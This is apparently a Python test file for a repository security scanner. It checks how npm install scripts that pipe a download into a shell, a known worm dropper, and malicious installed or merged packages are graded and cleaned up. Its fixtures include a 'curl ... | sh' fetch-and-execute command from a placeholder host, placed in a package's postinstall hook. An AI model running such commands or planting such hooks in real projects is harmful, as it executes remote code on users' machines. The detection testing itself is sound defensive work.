#!/usr/bin/env python3
"""A project's own install script that runs a download straight into a shell is for you to check, and
`saw fix` leaves its installed packages alone; the known worm's dropper still reads infected and is
cleaned up as before, and an installed package whose install script runs a download still reads
infected."""
from __future__ import annotations

import json
import unittest

from stayawake.bots.security.models import CONFIRMED, HEURISTIC, INFECTED, SUSPICIOUS, Severity
from stayawake.bots.security.remediation import live
from stayawake.bots.security.scanner import history_residue_note, scan_target
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import LocalRepoTarget
from stayawake.bots.security.targets.base import ScanOptions
from tests.bots.security.test_push_check import _Sandbox
from tests.support import samples
from tests.support.gitrepo import GitSandbox

DOWNLOAD = samples.joined("cu", "rl -fsSL https://example.invalid/i.sh | sh")
DROPPER = samples.joined("node setup_", "bun.js")
DEPENDENCY = json.dumps({"name": "evil", "version": "1.0.0", "scripts": {"postinstall": DOWNLOAD}})


class _Projects(GitSandbox):
    def project(self, scripts: dict, *, installed: dict | None = None):
        """A committed project whose package.json runs `scripts`, with a lockfile and the packages in
        `installed` (name → install script) under node_modules."""
        repo = self.new_repo("project")
        self.write(repo, ".gitignore", "node_modules/\n")
        self.write(repo, "package.json", json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts}))
        packages = {"": {"name": "p"}, **{f"node_modules/{name}": {"version": "1.0.0"} for name in installed or {}}}
        self.write(repo, "package-lock.json", json.dumps({"lockfileVersion": 3, "packages": packages}))
        self.commit(repo, "start")
        for name, script in (installed or {"left-pad": None}).items():
            manifest = {"name": name, "version": "1.0.0"}
            if script:
                manifest["scripts"] = {"postinstall": script}
            self.write(repo, f"node_modules/{name}/package.json", json.dumps(manifest))
            self.write(repo, f"node_modules/{name}/index.js", "module.exports = 1;\n")
        return repo

    @staticmethod
    def scan(repo):
        return scan_target(LocalRepoTarget(repo, "p", ScanOptions()), load_signatures(), [])

    def fix(self, repo):
        live.clean_checkout(repo, ScanOptions(), load_signatures(), [], scan=lambda *_a, **_k: self.scan(repo))


class TestAProjectsOwnInstallDownloadIsForYouToCheck(_Projects):
    def test_it_reads_suspicious_and_names_the_install_script(self):
        result = self.scan(self.project({"postinstall": DOWNLOAD}))
        self.assertEqual(result.verdict, SUSPICIOUS)
        [finding] = [f for f in result.findings if f.signature_id == "npm-lifecycle-remote-fetch"]
        self.assertEqual(finding.confidence, HEURISTIC)
        self.assertEqual(finding.path, "package.json")

    def test_a_workspace_package_reads_suspicious(self):
        repo = self.project({"test": "true"})
        self.write(repo, "packages/web/package.json", json.dumps({"name": "web", "scripts": {"postinstall": DOWNLOAD}}))
        self.commit(repo, "a workspace")
        self.assertEqual(self.scan(repo).verdict, SUSPICIOUS)

    def test_saw_fix_keeps_its_installed_packages_and_lockfile(self):
        repo = self.project({"postinstall": DOWNLOAD})
        self.fix(repo)
        self.assertTrue((repo / "node_modules" / "left-pad" / "index.js").is_file())
        self.assertTrue((repo / "package-lock.json").is_file())


class TestTheKnownDropperStillReadsInfected(_Projects):
    def test_the_dropper_beside_a_download_reads_infected(self):
        result = self.scan(self.project({"preinstall": DROPPER, "postinstall": DOWNLOAD}))
        self.assertEqual(result.verdict, INFECTED)
        self.assertIn("npm-lifecycle-dropper", {f.signature_id for f in result.findings if f.confidence == CONFIRMED})

    def test_saw_fix_still_takes_out_its_installed_packages_and_lockfile(self):
        repo = self.project({"preinstall": DROPPER, "postinstall": DOWNLOAD})
        self.fix(repo)
        self.assertFalse((repo / "node_modules" / "left-pad").exists())
        self.assertFalse((repo / "package-lock.json").exists())


class TestAnInstalledPackageThatRunsADownloadStillReadsInfected(_Projects):
    def test_it_reads_infected(self):
        result = self.scan(self.project({"test": "true"}, installed={"evil": DOWNLOAD}))
        self.assertEqual(result.verdict, INFECTED)
        self.assertIn("installed-lifecycle-hook",
                      {f.signature_id for f in result.findings if f.confidence == CONFIRMED})


class TestAnInstalledPackageCommittedToTheRepositoryStillReadsInfected(_Projects):
    def test_a_scan_that_reads_installed_packages_reads_it_critical_and_confirmed(self):
        repo = self.project({"test": "true"})
        self.write(repo, "node_modules/evil/package.json", DEPENDENCY)
        reads_them = ScanOptions()
        reads_them.exclude_dirs.discard("node_modules")
        result = scan_target(LocalRepoTarget(repo, "p", reads_them), load_signatures(), [])
        [finding] = [f for f in result.findings if f.signature_id == "npm-lifecycle-remote-fetch"]
        self.assertEqual((finding.confidence, finding.severity), (CONFIRMED, Severity.CRITICAL))

    def test_a_past_commit_that_held_it_names_saw_fix_amend(self):
        repo = self.project({"test": "true"})
        self.write(repo, "node_modules/evil/package.json", DEPENDENCY)
        self.git(repo, "add", "-f", "node_modules/evil/package.json")
        self.commit(repo, "vendor a package")
        self.git(repo, "rm", "-q", "-r", "--cached", "node_modules")
        self.commit(repo, "take it out")
        note = history_residue_note(repo, ScanOptions(history=True), load_signatures(), [])
        self.assertIn("saw fix amend", note or "")

    def test_a_merge_that_carries_it_carries_a_known_payload_where_the_scan_reads_installed_packages(self):
        repo = self.new_repo("project")
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "b.txt", "b\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "a.txt", "a2\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, "node_modules/evil/package.json", DEPENDENCY)
        self.git(repo, "add", "-f", "node_modules/evil/package.json")
        self.git(repo, "commit", "-qm", "Merge branch side")
        reads_them = ScanOptions()
        reads_them.exclude_dirs.discard("node_modules")
        result = scan_target(LocalRepoTarget(repo, "p", reads_them), load_signatures(), [])
        self.assertIn("evil-merge-payload", [f.signature_id for f in result.findings if f.vector == "evil-merge"])


class TestAPushOfAnInstalledPackageThatRunsADownloadStillReadsInfected(_Sandbox):
    def test_the_push_reports_a_worm(self):
        self.commit({"node_modules/evil/package.json": DEPENDENCY})
        _code, text = self.check(self.line("refs/heads/main"))
        self.assertIn("WORM DETECTED", text)


class TestAMergeThatAddsTheProjectsOwnInstallDownload(_Projects):
    def test_it_stays_a_merge_to_check(self):
        repo = self.new_repo("project")
        self.write(repo, "package.json", '{"name": "p", "scripts": {"test": "true"}}\n')
        self.write(repo, "a.txt", "a\n")
        self.commit(repo, "start")
        self.git(repo, "checkout", "-q", "-b", "side")
        self.write(repo, "b.txt", "b\n")
        self.commit(repo, "side")
        self.git(repo, "checkout", "-q", "main")
        self.write(repo, "a.txt", "a2\n")
        self.commit(repo, "main")
        self.git_may_fail(repo, "merge", "-q", "--no-commit", "--no-ff", "side")
        self.write(repo, "package.json", '{"name": "p", "scripts": {"test": "true", "postinstall": "%s"}}\n' % DOWNLOAD)
        self.git(repo, "add", "-A")
        self.git(repo, "commit", "-qm", "Merge branch side")
        merges = [f for f in self.scan(repo).findings if f.vector == "evil-merge"]
        self.assertTrue(merges)
        self.assertNotIn("evil-merge-payload", [f.signature_id for f in merges])
        self.assertNotIn(CONFIRMED, [f.confidence for f in merges])


if __name__ == "__main__":
    unittest.main()
